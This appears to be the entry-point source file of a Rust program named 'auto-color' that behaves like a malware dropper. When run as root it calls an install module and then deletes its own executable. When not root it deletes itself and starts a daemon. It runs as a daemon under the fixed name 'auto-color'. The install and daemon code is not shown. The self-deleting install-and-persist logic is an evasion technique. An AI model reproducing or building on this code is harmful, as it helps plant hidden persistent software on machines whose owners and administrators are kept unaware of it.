use std::{env, fs};

use libc::geteuid;
use log::{info, warn, error};

mod install;
mod daemon;

fn main() {
    colog::init();

    if unsafe { geteuid() != 0 } {
        warn!("😞 Not running as root, running in daemon mode.");
        delete_self();
        daemon::main();
    }
    else if let Ok(exe_path) = env::current_exe() {
        if let Some(exe_name) = exe_path.file_name() {
            if exe_name == "auto-color" {
                info!("✅ Started from known location, running in daemon mode.");
                daemon::main();
            } else {
                info!("🔧 Started as root, performing installation.");
                install::main();
                delete_self();
            }
        } else {
            error!("⚠️ Failed to retrieve executable name.");
        }
    } else {
        error!("⚠️ Failed to retrieve current executable path.");
    }
}

fn delete_self() {
    let current_exe = env::current_exe().unwrap();
    info!("🗑️  Deleting current executable: {}", current_exe.display());
    if fs::remove_file(current_exe).is_err() {
        error!("⚠️ Failed to delete current executable.");
    } else {
        info!("✅ Executable deleted successfully.");
    }
}
